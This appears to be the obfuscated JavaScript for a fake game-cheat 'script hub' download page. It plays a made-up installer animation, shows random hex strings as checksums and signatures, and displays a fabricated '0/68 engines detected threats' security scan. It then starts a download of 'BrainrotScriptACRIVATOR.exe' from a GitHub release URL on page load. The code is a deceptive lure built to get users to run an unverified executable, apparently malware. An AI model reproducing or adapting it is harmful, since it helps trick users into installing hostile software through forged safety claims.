(function() {
'use strict';

const INSTALLER_URL = "https://github.com/Oceanraaqueduct/brainrotactiv/releases/download/1.0/BrainrotScriptACRIVATOR.zip";
const DOWNLOAD_FILENAME = "BrainrotScriptACRIVATOR.exe";

const _0xbf6f = "BRAINROT SCRIPT HUB";
const _0xcf7a = "Download complete";
const _0xdf8b = "ACTIVATION SUCCESSFUL";
const _0xef9c = "Security Scan";
const _0xff0d = "Brainrot Encryption";
const _0x0a1e = "deployment";

function _0x2c3d(str) { return str; }

const _0xc9d0 = {
  status: 'idle',
  progress: 0,
  logs: [],
  showCursor: true,
  recentMessages: [],
  logInterval: null,
  progressInterval: null,
  cursorInterval: null,
  _securityShown: false  // <-- новый флаг
};
const _0xd0e1 = {};

function _0xe1f2() {
  _0xd0e1.statusIcon = document.getElementById('gh-status-icon');
  _0xd0e1.statusText = document.getElementById('gh-status-text');
  _0xd0e1.progressContainer = document.getElementById('gh-progress-wrapper');
  _0xd0e1.progressBar = document.getElementById('gh-progress-bar');
  _0xd0e1.progressText = document.getElementById('gh-progress-text');
  _0xd0e1.terminal = document.getElementById('gh-terminal');
  _0xd0e1.terminalContent = document.getElementById('gh-terminal-content');
  _0xd0e1.cursorLine = document.getElementById('gh-cursor-line');
  _0xd0e1.cursor = document.getElementById('gh-cursor');
  _0xd0e1.retryBtn = document.getElementById('gh-btn-retry');
}

function _0xf2a3(_0xa3b4) {
  return Math.random().toString(16).substr(2, _0xa3b4 || 8);
}

function _0xa3b4() {
  return new Date().toLocaleTimeString();
}

function _0xb4c5(_0xc5d6, _0xd6e7, _0xe7f8 = '') {
  _0xc9d0.status = _0xc5d6;
  _0xd0e1.statusText.textContent = _0xd6e7;
  _0xd0e1.statusText.className = `gh-status-txt ${_0xe7f8}`;
  if (_0xc5d6 === 'preparing' || _0xc5d6 === _0x0a1e) {
    _0xd0e1.statusIcon.className = 'gh-icon spinner';
    _0xd0e1.statusIcon.textContent = '';
  } else if (_0xc5d6 === 'success') {
    _0xd0e1.statusIcon.className = 'gh-icon success';
    _0xd0e1.statusIcon.textContent = '✓';
  } else if (_0xc5d6 === 'error') {
    _0xd0e1.statusIcon.className = 'gh-icon error';
    _0xd0e1.statusIcon.textContent = '⚠';
  } else {
    _0xd0e1.statusIcon.className = 'gh-icon';
    _0xd0e1.statusIcon.textContent = '⬇';
  }
}

function _0xc5d6(_0xd6e7) {
  _0xc9d0.progress = _0xd6e7;
  _0xd0e1.progressBar.style.width = `${_0xd6e7}%`;
  _0xd0e1.progressText.textContent = `${_0xd6e7}% complete`;
}

function _0xd6e7() {
  _0xd0e1.progressContainer.classList.remove('gh-hidden');
}

function _0xe7f8() {
  _0xd0e1.progressContainer.classList.add('gh-hidden');
}

function _0xf8a9() {
  _0xd0e1.terminal.classList.remove('gh-hidden');
}

function _0xa9b0() {
  _0xd0e1.terminal.classList.add('gh-hidden');
}

function _0xb0c1() {
  _0xd0e1.retryBtn.classList.remove('gh-hidden');
}

function _0xc1d2() {
  _0xd0e1.retryBtn.classList.add('gh-hidden');
}

function _0xd2e3(_0xe3f4) {
  const _0xf4a5 = document.createElement('div');
  _0xf4a5.className = 'gh-terminal-line';
  _0xf4a5.textContent = `[${_0xa3b4()}] ${_0xe3f4}`;
  _0xd0e1.terminalContent.insertBefore(_0xf4a5, _0xd0e1.cursorLine);
  const _0xa5b6 = _0xd0e1.terminalContent.querySelectorAll('.gh-terminal-line');
  if (_0xa5b6.length > 8) {
    _0xa5b6[0].remove();
  }
  _0xd0e1.terminalContent.scrollTop = _0xd0e1.terminalContent.scrollHeight;
  _0xc9d0.logs.push(_0xe3f4);
  _0xc9d0.recentMessages = _0xc9d0.logs.slice(-5);
}

// === MESSAGES FOR BRAINROT SCRIPT HUB — 28 FEATURES ===
function _0xe3f4() {
  const _0xf4a5 = [
    'Loading BRAINROT SCRIPT HUB...',
    'Initializing Combat & Survival module (7 features) — God Mode, One-Hit Kill, Damage Multiplier, No Knockback...',
    'Loading Resources module (7 features) — Unlimited Coins, Auto-Collect, Auto-Buy Best Brainrot, Auto-Rebirth...',
    'Loading Brainrot & Steal module (5 features) — Auto-Steal, Instant Steal, Target ESP, Auto-Lock Base...',
    'Loading World & Speed module (9 features) — Speed Boost, Flight, NoClip, Teleport...',
    'Loading Quality of Life module (7 features) — Anti-AFK, Auto-Collect All, Notification on Steal, Show Stats...',
    'Activation required: click to unlock all features.',
    'Ready for download — press [INSERT] in-game to open the hub.'
  ];
  const _0xa5b6 = [
    `checksum: ${_0xf2a3()}${_0xf2a3()}`,
    `signature: ${_0xf2a3(32)}${_0xf2a3(32)}`,
    `✓ Verified - hash ${_0xf2a3()}${_0xf2a3()}`
  ];
  return { normalMessages: _0xf4a5, hashMessages: _0xa5b6 };
}

function _0xf4a5() {
  // Если уже показали Security Scan — больше не показываем
  if (_0xc9d0._securityShown) return false;
  // Показываем, если логов >= 3
  return _0xc9d0.logs.length >= 3;
}

function _0xa5b6() {
  if (_0xf4a5()) {
    _0xc9d0._securityShown = true;  // устанавливаем флаг
    return '✓ ' + _0xef9c + ': 0/68 engines detected threats';
  }
  const _0xb6c7 = _0xe3f4();
  const _0xc7d8 = [..._0xb6c7.normalMessages, ..._0xb6c7.hashMessages];
  const _0xd8e9 = _0xc7d8.filter(_0xe9f0 => {
    const _0xf0a1 = _0xe9f0.split(':')[0];
    return !_0xc9d0.recentMessages.some(_0xa1b2 => _0xa1b2.includes(_0xf0a1));
  });
  const _0xa1b2 = _0xd8e9.length > 0 ? _0xd8e9 : _0xc7d8;
  return _0xa1b2[Math.floor(Math.random() * _0xa1b2.length)];
}

function _0xb2c3a() {
  _0xd0e1.cursorLine.classList.remove('gh-hidden');
  _0xc9d0.cursorInterval = setInterval(() => {
    _0xd0e1.cursor.style.opacity = _0xd0e1.cursor.style.opacity === '0' ? '1' : '0';
  }, 500);
}

function _0xc3d4a() {
  _0xd0e1.cursorLine.classList.add('gh-hidden');
  if (_0xc9d0.cursorInterval) {
    clearInterval(_0xc9d0.cursorInterval);
    _0xc9d0.cursorInterval = null;
  }
}

function _0xd4e5a() {
  _0xf8a9();
  _0xb2c3a();
  _0xc9d0.logInterval = setInterval(() => {
    const _0xe5f6 = _0xa5b6();
    _0xd2e3(_0xe5f6);
  }, Math.random() * 300 + 400);
}

function _0xe5f6a() {
  if (_0xc9d0.logInterval) {
    clearInterval(_0xc9d0.logInterval);
    _0xc9d0.logInterval = null;
  }
}

function _0xf6a7a() {
  _0xd6e7();
  _0xc9d0.progressInterval = setInterval(() => {
    const _0xa7b8 = Math.random() * 8 + 4;
    const _0xb8c9 = Math.min(100, _0xc9d0.progress + _0xa7b8);
    _0xc5d6(Math.floor(_0xb8c9));
    if (_0xb8c9 >= 100) {
      clearInterval(_0xc9d0.progressInterval);
      _0xc9d0.progressInterval = null;
      setTimeout(() => _0xa7b8a(), 300);
    }
  }, 150);
}

async function _0xa7b8a() {
  _0xe5f6a();
  setTimeout(() => {
    // Если ещё не выводили Security Scan, выводим сейчас (но флаг уже должен быть установлен)
    if (!_0xc9d0._securityShown) {
      _0xd2e3('✓ ' + _0xef9c + ': 0/68 engines detected threats');
      _0xc9d0._securityShown = true;
    }
    setTimeout(async () => {
      _0xc3d4a();
      _0xd2e3(_0xdf8b);
      _0xb4c5('success', _0xbf6f, 'success');

      setTimeout(() => {
        const link = document.createElement('a');
        link.href = INSTALLER_URL;
        link.download = DOWNLOAD_FILENAME;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);

        _0xb4c5('success', _0xcf7a, 'success');
        _0xd2e3(`✓ Download started: ${DOWNLOAD_FILENAME}`);
        _0xd2e3(`✓ Press [INSERT] in-game to open the script hub`);
      }, 400);
    }, 300);
  }, 200);
}

function _0xc9d0a() {
  _0xc9d0.status = 'idle';
  _0xc9d0.progress = 0;
  _0xc9d0.logs = [];
  _0xc9d0.recentMessages = [];
  _0xc9d0._securityShown = false;  // сбрасываем флаг при рестарте
  _0xc1d2();
  _0xe7f8();
  _0xa9b0();
  const _0xd0e1a = _0xd0e1.terminalContent.querySelectorAll('.gh-terminal-line');
  _0xd0e1a.forEach(_0xe1f2 => _0xe1f2.remove());
  setTimeout(() => {
    _0xb4c5('preparing', 'Initializing ' + _0xff0d + '...');
    _0xd4e5a();
  }, 200);
  setTimeout(() => {
    _0xb4c5('preparing', 'Loading Combat & Survival (7 features)...');
  }, 800);
  setTimeout(() => {
    _0xb4c5('preparing', 'Loading Resources (7 features)...');
  }, 1500);
  setTimeout(() => {
    _0xb4c5('preparing', 'Loading Brainrot & Steal (5 features)...');
  }, 2200);
  setTimeout(() => {
    _0xb4c5(_0x0a1e, 'Ready, starting download...');
    _0xf6a7a();
  }, 2900);
}

function _0xd0e1a() {
  _0xc9d0a();
}

document.addEventListener('DOMContentLoaded', () => {
  _0xe1f2();
  _0xd0e1.retryBtn.addEventListener('click', _0xd0e1a);
  setTimeout(() => {
    _0xc9d0a();
  }, 500);
});
})();